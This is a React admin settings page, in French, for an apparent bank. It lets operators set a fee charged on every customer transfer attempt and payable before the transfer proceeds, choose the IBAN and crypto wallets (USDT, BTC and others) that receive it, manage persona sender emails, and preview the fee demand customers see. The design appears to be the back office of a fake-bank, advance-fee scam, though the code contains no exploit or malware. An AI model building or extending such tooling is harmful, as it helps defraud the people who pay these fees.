"use client";
import { useEffect, useState, useCallback } from "react";
import { useAdmin } from "../layout";
import { Settings, Save, Euro, Building2, RefreshCw, Check, Bitcoin, Plus, Trash2, Mail, Power } from "lucide-react";

type FeePayment = { name: string; iban: string; bic: string; bank: string; reference: string };
type TransferFee = { amount: number; currency: string };
type CryptoWallet = { coin: string; label: string; network: string; address: string; qr_url?: string | null };
type Sender = { id: string; email: string; label: string; active: boolean };

const CRYPTO_PRESETS: { coin: string; label: string; network: string }[] = [
  { coin: "btc", label: "Bitcoin", network: "Bitcoin" },
  { coin: "usdt_bep20", label: "USDT (BEP-20)", network: "BNB Smart Chain" },
  { coin: "usdt_trc20", label: "USDT (TRC-20)", network: "Tron" },
  { coin: "eth", label: "Ethereum", network: "ERC-20" },
  { coin: "sol", label: "Solana", network: "Solana" },
  { coin: "usdc", label: "USDC", network: "ERC-20" },
];

function Field({ label, value, onChange, type = "text", mono = false }: {
  label: string; value: string; onChange: (v: string) => void; type?: string; mono?: boolean;
}) {
  return (
    <div style={{ marginBottom: 14 }}>
      <label style={{ color: "rgba(255,255,255,0.45)", fontSize: "0.72rem", fontWeight: 600, display: "block", marginBottom: 6, textTransform: "uppercase", letterSpacing: "0.06em" }}>{label}</label>
      <input type={type} value={value} onChange={(e) => onChange(e.target.value)}
        style={{ width: "100%", height: 44, background: "#252836", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 10, color: "white", fontSize: "0.9rem", padding: "0 14px", boxSizing: "border-box", outline: "none", fontFamily: mono ? "monospace" : "inherit" }} />
    </div>
  );
}

export default function SettingsPage() {
  const { token } = useAdmin();
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [saved, setSaved] = useState(false);

  const [fee, setFee] = useState<TransferFee>({ amount: 50, currency: "EUR" });
  const [payment, setPayment] = useState<FeePayment>({ name: "", iban: "", bic: "", bank: "", reference: "FRAIS-VIREMENT" });
  const [wallets, setWallets] = useState<CryptoWallet[]>([]);

  // System sender identities
  const [senders, setSenders] = useState<Sender[]>([]);
  const [newEmail, setNewEmail] = useState("");
  const [newLabel, setNewLabel] = useState("");
  const [senderErr, setSenderErr] = useState("");
  const [senderBusy, setSenderBusy] = useState(false);

  useEffect(() => {
    fetch("/api/kt/admin/settings", { headers: { Authorization: `Bearer ${token}` } })
      .then((r) => r.json())
      .then((d) => {
        if (d.transfer_fee) setFee(d.transfer_fee);
        if (d.fee_payment) setPayment(d.fee_payment);
        if (Array.isArray(d.crypto_wallets)) setWallets(d.crypto_wallets);
        setLoading(false);
      });
  }, [token]);

  const loadSenders = useCallback(() => {
    fetch("/api/kt/admin/senders", { headers: { Authorization: `Bearer ${token}` } })
      .then((r) => (r.ok ? r.json() : null))
      .then((d) => { if (Array.isArray(d?.senders)) setSenders(d.senders); })
      .catch(() => {});
  }, [token]);
  useEffect(() => { loadSenders(); }, [loadSenders]);

  async function addSender() {
    setSenderErr("");
    if (!newEmail.trim() || !newLabel.trim()) { setSenderErr("Adresse et libellé requis."); return; }
    setSenderBusy(true);
    const res = await fetch("/api/kt/admin/senders", {
      method: "POST", headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      body: JSON.stringify({ email: newEmail.trim(), label: newLabel.trim() }),
    });
    setSenderBusy(false);
    if (!res.ok) { const d = await res.json().catch(() => ({})); setSenderErr(d.error || "Ajout échoué"); return; }
    setNewEmail(""); setNewLabel(""); loadSenders();
  }
  async function toggleSender(s: Sender) {
    await fetch("/api/kt/admin/senders", {
      method: "PATCH", headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      body: JSON.stringify({ id: s.id, active: !s.active }),
    });
    loadSenders();
  }
  async function removeSender(s: Sender) {
    if (!window.confirm(`Supprimer l'adresse ${s.email} ?`)) return;
    await fetch(`/api/kt/admin/senders?id=${s.id}`, { method: "DELETE", headers: { Authorization: `Bearer ${token}` } });
    loadSenders();
  }

  function addWallet(preset?: { coin: string; label: string; network: string }) {
    setWallets((w) => [...w, preset ? { ...preset, address: "" } : { coin: "", label: "", network: "", address: "" }]);
  }
  function updateWallet(i: number, patch: Partial<CryptoWallet>) {
    setWallets((w) => w.map((x, j) => (j === i ? { ...x, ...patch } : x)));
  }
  function removeWallet(i: number) {
    setWallets((w) => w.filter((_, j) => j !== i));
  }

  async function save() {
    setSaving(true);
    await fetch("/api/kt/admin/settings", {
      method: "PATCH",
      headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
      // keep only wallets that actually have an address
      body: JSON.stringify({ transfer_fee: fee, fee_payment: payment, crypto_wallets: wallets.filter((w) => w.address.trim() && w.label.trim()) }),
    });
    setSaving(false);
    setSaved(true);
    setTimeout(() => setSaved(false), 3000);
  }

  if (loading) return <div style={{ padding: 32, color: "rgba(255,255,255,0.4)" }}>Chargement…</div>;

  return (
    <div style={{ padding: 32, maxWidth: 700 }}>
      <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 28 }}>
        <div style={{ width: 40, height: 40, borderRadius: 12, background: "rgba(0,95,45,0.2)", display: "flex", alignItems: "center", justifyContent: "center" }}>
          <Settings size={20} color="#4CAF82" />
        </div>
        <div>
          <h1 style={{ color: "white", fontWeight: 800, fontSize: "1.2rem", margin: 0 }}>Paramètres</h1>
          <p style={{ color: "rgba(255,255,255,0.35)", fontSize: "0.8rem", margin: 0 }}>Frais de virement et coordonnées de paiement</p>
        </div>
      </div>

      {/* Sender identities */}
      <div style={{ background: "#1A1D27", borderRadius: 14, border: "1px solid rgba(255,255,255,0.06)", marginBottom: 20, overflow: "hidden" }}>
        <div style={{ padding: "14px 20px", borderBottom: "1px solid rgba(255,255,255,0.06)", display: "flex", alignItems: "center", gap: 8 }}>
          <Mail size={15} color="#4CAF82" />
          <p style={{ color: "white", fontWeight: 600, fontSize: "0.88rem", margin: 0 }}>Adresses expéditrices (messagerie)</p>
        </div>
        <div style={{ padding: "16px 20px" }}>
          <p style={{ color: "rgba(255,255,255,0.4)", fontSize: "0.8rem", marginBottom: 16, lineHeight: 1.6 }}>
            Les adresses depuis lesquelles vous pouvez envoyer des emails aux clients. Le <strong style={{ color: "#4CAF82" }}>Nom affiché</strong> est juste le nom (ex: David Lenian) — l&apos;intitulé/rôle (Account manager, Kontobetreuer…) se choisit <strong>à chaque message</strong> selon la langue du client. Uniquement le domaine <strong style={{ color: "#4CAF82" }}>@kt-bank-ag.com</strong>.
          </p>

          {senders.map((s) => (
            <div key={s.id} style={{ display: "flex", alignItems: "center", gap: 10, background: "#0F1117", borderRadius: 10, border: "1px solid rgba(255,255,255,0.06)", padding: "10px 14px", marginBottom: 8 }}>
              <div style={{ flex: 1, minWidth: 0 }}>
                <p style={{ color: s.active ? "white" : "rgba(255,255,255,0.4)", fontWeight: 600, fontSize: "0.84rem", margin: 0 }}>{s.label}</p>
                <p style={{ color: "rgba(255,255,255,0.4)", fontSize: "0.76rem", margin: "2px 0 0", fontFamily: "monospace" }}>{s.email}</p>
              </div>
              <button onClick={() => toggleSender(s)} title={s.active ? "Désactiver" : "Activer"}
                style={{ background: s.active ? "rgba(74,222,128,0.12)" : "rgba(255,255,255,0.06)", border: "none", borderRadius: 8, padding: "6px 8px", cursor: "pointer", color: s.active ? "#4ADE80" : "rgba(255,255,255,0.35)", display: "flex", alignItems: "center", gap: 5, fontSize: "0.72rem", fontWeight: 600 }}>
                <Power size={12} /> {s.active ? "Actif" : "Inactif"}
              </button>
              <button onClick={() => removeSender(s)} title="Supprimer"
                style={{ background: "rgba(248,113,113,0.12)", border: "none", borderRadius: 8, padding: "6px 8px", cursor: "pointer", color: "#F87171", display: "flex" }}>
                <Trash2 size={13} />
              </button>
            </div>
          ))}

          <div style={{ marginTop: 14, borderTop: "1px solid rgba(255,255,255,0.06)", paddingTop: 14 }}>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginBottom: 8 }}>
              <input value={newLabel} onChange={(e) => setNewLabel(e.target.value)} placeholder="Nom affiché (ex: David Lenian)"
                style={{ height: 40, background: "#252836", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 9, color: "white", fontSize: "0.84rem", padding: "0 12px", boxSizing: "border-box", outline: "none" }} />
              <input value={newEmail} onChange={(e) => setNewEmail(e.target.value)} placeholder="prenom.nom@kt-bank-ag.com"
                style={{ height: 40, background: "#252836", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 9, color: "white", fontSize: "0.84rem", padding: "0 12px", boxSizing: "border-box", outline: "none", fontFamily: "monospace" }} />
            </div>
            {senderErr && <p style={{ color: "#F87171", fontSize: "0.78rem", margin: "0 0 8px" }}>{senderErr}</p>}
            <button onClick={addSender} disabled={senderBusy}
              style={{ display: "inline-flex", alignItems: "center", gap: 6, background: "#005F2D", border: "none", borderRadius: 9, color: "white", fontWeight: 700, fontSize: "0.82rem", padding: "9px 16px", cursor: senderBusy ? "not-allowed" : "pointer", opacity: senderBusy ? 0.6 : 1 }}>
              <Plus size={14} /> {senderBusy ? "Ajout…" : "Ajouter une adresse"}
            </button>
            <p style={{ color: "rgba(255,255,255,0.3)", fontSize: "0.72rem", margin: "10px 0 0", lineHeight: 1.5 }}>
              ⚠ Pour recevoir les réponses à une nouvelle adresse, elle doit aussi être routée vers le Worker dans Cloudflare → Email Routing (ou activer le catch-all).
            </p>
          </div>
        </div>
      </div>

      {/* Fee amount */}
      <div style={{ background: "#1A1D27", borderRadius: 14, border: "1px solid rgba(255,255,255,0.06)", marginBottom: 20, overflow: "hidden" }}>
        <div style={{ padding: "14px 20px", borderBottom: "1px solid rgba(255,255,255,0.06)", display: "flex", alignItems: "center", gap: 8 }}>
          <Euro size={15} color="#4CAF82" />
          <p style={{ color: "white", fontWeight: 600, fontSize: "0.88rem", margin: 0 }}>Frais de virement</p>
        </div>
        <div style={{ padding: "16px 20px" }}>
          <p style={{ color: "rgba(255,255,255,0.4)", fontSize: "0.8rem", marginBottom: 16, lineHeight: 1.6 }}>
            Ce montant sera demandé au client lors de chaque tentative de virement. Il devra effectuer ce paiement aux coordonnées ci-dessous avant que son virement soit traité.
          </p>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
            <div>
              <label style={{ color: "rgba(255,255,255,0.45)", fontSize: "0.72rem", fontWeight: 600, display: "block", marginBottom: 6, textTransform: "uppercase", letterSpacing: "0.06em" }}>Montant (€)</label>
              <input type="number" min="0" value={fee.amount} onChange={(e) => setFee((f) => ({ ...f, amount: Number(e.target.value) }))}
                style={{ width: "100%", height: 44, background: "#252836", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 10, color: "#4CAF82", fontWeight: 700, fontSize: "1.1rem", padding: "0 14px", boxSizing: "border-box", outline: "none" }} />
            </div>
            <div>
              <label style={{ color: "rgba(255,255,255,0.45)", fontSize: "0.72rem", fontWeight: 600, display: "block", marginBottom: 6, textTransform: "uppercase", letterSpacing: "0.06em" }}>Devise</label>
              <select value={fee.currency} onChange={(e) => setFee((f) => ({ ...f, currency: e.target.value }))}
                style={{ width: "100%", height: 44, background: "#252836", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 10, color: "white", fontSize: "0.9rem", padding: "0 14px", boxSizing: "border-box", outline: "none" }}>
                <option value="EUR">EUR</option>
                <option value="USD">USD</option>
                <option value="GBP">GBP</option>
              </select>
            </div>
          </div>
          {fee.amount === 0 && (
            <div style={{ marginTop: 10, padding: "8px 12px", background: "rgba(255,200,0,0.1)", borderRadius: 8, border: "1px solid rgba(255,200,0,0.2)" }}>
              <p style={{ color: "#FCD34D", fontSize: "0.78rem", margin: 0 }}>⚠ Frais à 0 € : aucun paiement ne sera demandé aux clients.</p>
            </div>
          )}
        </div>
      </div>

      {/* Payment coordinates */}
      <div style={{ background: "#1A1D27", borderRadius: 14, border: "1px solid rgba(255,255,255,0.06)", marginBottom: 20, overflow: "hidden" }}>
        <div style={{ padding: "14px 20px", borderBottom: "1px solid rgba(255,255,255,0.06)", display: "flex", alignItems: "center", gap: 8 }}>
          <Building2 size={15} color="#4CAF82" />
          <p style={{ color: "white", fontWeight: 600, fontSize: "0.88rem", margin: 0 }}>Coordonnées de paiement des frais</p>
        </div>
        <div style={{ padding: "16px 20px" }}>
          <p style={{ color: "rgba(255,255,255,0.4)", fontSize: "0.8rem", marginBottom: 16, lineHeight: 1.6 }}>
            Compte bancaire vers lequel le client doit envoyer les frais de virement. Ces informations lui seront affichées directement dans l&apos;application.
          </p>
          <Field label="Nom du bénéficiaire" value={payment.name} onChange={(v) => setPayment((p) => ({ ...p, name: v }))} />
          <Field label="IBAN" value={payment.iban} onChange={(v) => setPayment((p) => ({ ...p, iban: v }))} mono />
          <Field label="BIC / SWIFT" value={payment.bic} onChange={(v) => setPayment((p) => ({ ...p, bic: v }))} mono />
          <Field label="Banque" value={payment.bank} onChange={(v) => setPayment((p) => ({ ...p, bank: v }))} />
          <Field label="Référence à indiquer" value={payment.reference} onChange={(v) => setPayment((p) => ({ ...p, reference: v }))} />
        </div>
      </div>

      {/* Crypto wallets */}
      <div style={{ background: "#1A1D27", borderRadius: 14, border: "1px solid rgba(255,255,255,0.06)", marginBottom: 20, overflow: "hidden" }}>
        <div style={{ padding: "14px 20px", borderBottom: "1px solid rgba(255,255,255,0.06)", display: "flex", alignItems: "center", gap: 8 }}>
          <Bitcoin size={15} color="#4CAF82" />
          <p style={{ color: "white", fontWeight: 600, fontSize: "0.88rem", margin: 0 }}>Portefeuilles crypto (règlement de frais)</p>
        </div>
        <div style={{ padding: "16px 20px" }}>
          <p style={{ color: "rgba(255,255,255,0.4)", fontSize: "0.8rem", marginBottom: 16, lineHeight: 1.6 }}>
            Adresses crypto vers lesquelles les clients peuvent régler leurs frais. Un QR code est généré automatiquement à partir de l&apos;adresse. Laissez vide pour ne pas proposer une crypto.
          </p>

          {wallets.map((w, i) => (
            <div key={i} style={{ background: "#0F1117", borderRadius: 12, border: "1px solid rgba(255,255,255,0.06)", padding: "14px 16px", marginBottom: 12 }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 10 }}>
                <span style={{ color: "#4CAF82", fontWeight: 700, fontSize: "0.82rem" }}>{w.label || "Nouvelle crypto"}</span>
                <button onClick={() => removeWallet(i)} style={{ background: "rgba(248,113,113,0.12)", border: "none", borderRadius: 8, padding: "5px 8px", cursor: "pointer", color: "#F87171", display: "flex", alignItems: "center", gap: 4, fontSize: "0.72rem" }}>
                  <Trash2 size={12} /> Retirer
                </button>
              </div>
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10 }}>
                <div>
                  <label style={{ color: "rgba(255,255,255,0.45)", fontSize: "0.68rem", fontWeight: 600, display: "block", marginBottom: 5, textTransform: "uppercase" }}>Nom affiché</label>
                  <input value={w.label} onChange={(e) => updateWallet(i, { label: e.target.value })} placeholder="USDT (BEP-20)"
                    style={{ width: "100%", height: 40, background: "#252836", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 9, color: "white", fontSize: "0.85rem", padding: "0 12px", boxSizing: "border-box", outline: "none" }} />
                </div>
                <div>
                  <label style={{ color: "rgba(255,255,255,0.45)", fontSize: "0.68rem", fontWeight: 600, display: "block", marginBottom: 5, textTransform: "uppercase" }}>Réseau</label>
                  <input value={w.network} onChange={(e) => updateWallet(i, { network: e.target.value })} placeholder="BNB Smart Chain"
                    style={{ width: "100%", height: 40, background: "#252836", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 9, color: "white", fontSize: "0.85rem", padding: "0 12px", boxSizing: "border-box", outline: "none" }} />
                </div>
              </div>
              <div style={{ marginTop: 10 }}>
                <label style={{ color: "rgba(255,255,255,0.45)", fontSize: "0.68rem", fontWeight: 600, display: "block", marginBottom: 5, textTransform: "uppercase" }}>Adresse du portefeuille</label>
                <input value={w.address} onChange={(e) => updateWallet(i, { address: e.target.value })} placeholder="0x…"
                  style={{ width: "100%", height: 40, background: "#252836", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 9, color: "white", fontSize: "0.85rem", padding: "0 12px", boxSizing: "border-box", outline: "none", fontFamily: "monospace" }} />
              </div>
            </div>
          ))}

          <div style={{ display: "flex", flexWrap: "wrap", gap: 8, marginTop: 6 }}>
            {CRYPTO_PRESETS.filter((p) => !wallets.some((w) => w.coin === p.coin)).map((p) => (
              <button key={p.coin} onClick={() => addWallet(p)}
                style={{ display: "flex", alignItems: "center", gap: 5, background: "rgba(0,95,45,0.18)", border: "1px solid rgba(0,95,45,0.4)", borderRadius: 9, padding: "7px 11px", color: "#4CAF82", fontSize: "0.76rem", fontWeight: 600, cursor: "pointer" }}>
                <Plus size={12} /> {p.label}
              </button>
            ))}
            <button onClick={() => addWallet()}
              style={{ display: "flex", alignItems: "center", gap: 5, background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.12)", borderRadius: 9, padding: "7px 11px", color: "rgba(255,255,255,0.7)", fontSize: "0.76rem", fontWeight: 600, cursor: "pointer" }}>
              <Plus size={12} /> Autre
            </button>
          </div>
        </div>
      </div>

      {/* Preview */}
      <div style={{ background: "#1A1D27", borderRadius: 14, border: "1px solid rgba(255,255,255,0.06)", marginBottom: 20, overflow: "hidden" }}>
        <div style={{ padding: "14px 20px", borderBottom: "1px solid rgba(255,255,255,0.06)" }}>
          <p style={{ color: "white", fontWeight: 600, fontSize: "0.88rem", margin: 0 }}>Aperçu — ce que voit le client</p>
        </div>
        <div style={{ padding: "16px 20px" }}>
          <div style={{ background: "#0F1117", borderRadius: 12, padding: "18px 20px", border: "1px solid rgba(255,255,255,0.05)" }}>
            <p style={{ color: "white", fontWeight: 700, fontSize: "0.9rem", margin: "0 0 6px" }}>Frais de virement requis</p>
            <p style={{ color: "rgba(255,255,255,0.5)", fontSize: "0.8rem", margin: "0 0 16px", lineHeight: 1.6 }}>
              Pour finaliser votre virement, veuillez régler les frais de traitement en effectuant un virement vers les coordonnées suivantes.
            </p>
            <div style={{ background: "rgba(255,255,255,0.04)", borderRadius: 10, padding: "14px 16px" }}>
              {[
                ["Bénéficiaire", payment.name || "—"],
                ["IBAN", payment.iban || "—"],
                ["BIC", payment.bic || "—"],
                ["Banque", payment.bank || "—"],
                ["Référence", payment.reference || "—"],
                ["Montant des frais", `${fee.amount} ${fee.currency}`],
              ].map(([label, value]) => (
                <div key={label} style={{ display: "flex", justifyContent: "space-between", marginBottom: 6 }}>
                  <span style={{ color: "rgba(255,255,255,0.4)", fontSize: "0.78rem" }}>{label}</span>
                  <span style={{ color: "white", fontWeight: 600, fontSize: "0.78rem", fontFamily: label === "IBAN" || label === "BIC" ? "monospace" : "inherit" }}>{value}</span>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      <button onClick={save} disabled={saving}
        style={{ height: 48, padding: "0 28px", background: saved ? "#4CAF82" : "#005F2D", border: "none", borderRadius: 12, color: "white", fontWeight: 700, fontSize: "0.9rem", cursor: "pointer", display: "flex", alignItems: "center", gap: 8, opacity: saving ? 0.7 : 1, transition: "background 0.2s" }}>
        {saving ? <><RefreshCw size={16} /> Enregistrement…</> : saved ? <><Check size={16} /> Enregistré !</> : <><Save size={16} /> Enregistrer les paramètres</>}
      </button>
    </div>
  );
}
